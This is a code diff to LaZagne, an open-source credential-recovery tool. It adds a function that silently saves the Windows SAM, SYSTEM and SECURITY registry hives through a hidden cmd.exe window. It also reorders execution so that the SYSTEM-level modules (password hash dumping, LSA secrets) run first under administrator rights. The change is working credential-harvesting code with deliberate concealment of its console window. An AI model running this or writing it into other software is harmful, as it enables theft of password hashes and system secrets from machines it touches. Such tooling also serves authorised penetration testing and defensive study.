@@ -15,6 +15,8 @@ from lazagne.config.change_privileges import list_sids, rev2self, impersonate_si
 from lazagne.config.manage_modules import get_categories, get_modules
 from lazagne.config.dpapi_structure import *
 from lazagne.config.constant import *
+import subprocess
+import _subprocess as sub
 import traceback
 import argparse
 import logging
@@ -242,6 +244,22 @@ def print_user(user):
 	if logging.getLogger().isEnabledFor(logging.INFO) == True:
 		constant.st.print_user(user)
 
+def save_hives():
+	for h in constant.hives:
+		if not os.path.exists(constant.hives[h]):
+			try:
+				cmdline 			= 'reg.exe save hklm\%s %s' % (h, constant.hives[h])
+				command 			= ['cmd.exe', '/c', cmdline]
+				info 				= subprocess.STARTUPINFO()
+				info.dwFlags 		= sub.STARTF_USESHOWWINDOW
+				info.wShowWindow 	= sub.SW_HIDE
+				p 			= subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
+				results, _ 	= p.communicate()
+			except Exception,e:
+				print_debug('ERROR', u'Failed to save system hives: {error}'.format(error=e))
+				return False
+	return True
+
 def clean_temporary_files():
 	# Try to remove all temporary files
 	for h in constant.hives:
@@ -256,6 +274,23 @@ def runLaZagne(category_choosed='all', password=None):
 	# Useful if this function is called from another tool
 	if password:
 		constant.user_password = password
+
+	# --------- Execute System modules ---------
+	# First modules to execute 
+	if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+		if save_hives():
+			# System modules (hashdump, lsa secrets, etc.)
+			constant.username  		= 'SYSTEM'
+			constant.finalResults 	= {'User': constant.username}
+			
+			if logging.getLogger().isEnabledFor(logging.INFO):
+				constant.st.print_user(constant.username)
+			yield 'User', constant.username
+			for r in runModule(category_choosed, system_module=True, dpapi_used=False):
+				yield r
+
+			stdoutRes.append(constant.finalResults)
+			clean_temporary_files()
 
 	# ------ Part used for user impersonation ------ 
 
@@ -331,19 +366,6 @@ def runLaZagne(category_choosed='all', password=None):
 				yield r
 			
 			stdoutRes.append(constant.finalResults)
-
-		# --------- Execute System modules ---------
-		# System modules (hashdump, lsa secrets, etc.)
-		constant.username  		= 'SYSTEM'
-		constant.finalResults 	= {'User': constant.username}
-		
-		if logging.getLogger().isEnabledFor(logging.INFO):
-			constant.st.print_user(constant.username)
-		yield 'User', constant.username
-		for r in runModule(category_choosed, system_module=True, dpapi_used=False):
-			yield r
-
-		stdoutRes.append(constant.finalResults)
 
 if __name__ == '__main__':
 
